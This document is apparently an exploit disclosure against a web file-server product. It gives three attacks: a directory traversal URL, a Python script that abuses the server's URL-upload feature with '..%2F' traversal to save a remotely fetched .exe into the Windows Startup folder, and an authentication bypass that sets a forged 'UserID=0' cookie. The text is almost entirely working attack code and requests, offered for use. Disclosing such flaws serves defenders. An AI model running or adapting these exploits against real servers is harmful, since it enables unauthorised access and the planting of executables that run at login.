Directory Traversal:

http://www.example.com/temp/..%2FUsers
==========================================================

Arbitrary-file Upload:

import socket, urllib

# Update these
username = 'a'
password = 'a'

# The attacker controlled file
remote_file1 = 'http://www.google.com/images/logos/ps_logo2.png'

# The name of the file on the target server 
remote_file2 = 'exploit_test.exe'

# The destination of the remote file
target_folder = 'Users/Test User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'

# This must be an existing virtual folder
path = '/temp'

host = 'localhost'
port = 80

def upload_shell():
    for i in reversed(range(0, 16)):
        print 'trying...'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(8)    

        s.send('POST ' + path + '/' + '..%2F' * i + urllib.quote(target_folder) + ' HTTP/1.1\r\n'
               'Host: localhost\r\n'
               'Connection: keep-alive\r\n'
               'Referer: http://localhost/uploadurl.ghp?vfolder=/temp/test\r\n'
               'Content-Length: 181\r\n'
               'Cache-Control: max-age=0\r\n'
               'Origin: http://localhost\r\n'
               'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16\r\n'
               'Content-Type: application/x-www-form-urlencoded\r\n'
               'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'
               'Accept-Encoding: gzip,deflate,sdch\r\n'
               'Accept-Language: en-US,en;q=0.8\r\n'
               'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
               '\r\n'
               'uploadid=21305471&vfoldername=%2ftemp&upload_author=' + username + '&upload_passwd=' + password + '&file_des=&file_url=' + urllib.quote(remote_file1) + '&saveas=' + urllib.quote(remote_file2) + '&uploadurl=Upload')

        resp = s.recv(8192)

        http_ok = 'HTTP/1.0 200 OK'
        
        if http_ok not in resp[:len(http_ok)]:
            print 'error uploading shell'
        else:
            print 'shell uploaded'
            return

upload_shell()
==============================================================================================================================

Authentication Bypass:

GET http://www.example.com/[Virtual Folder] HTTP/1.1
Host: localhost
Cookie: UserID=0
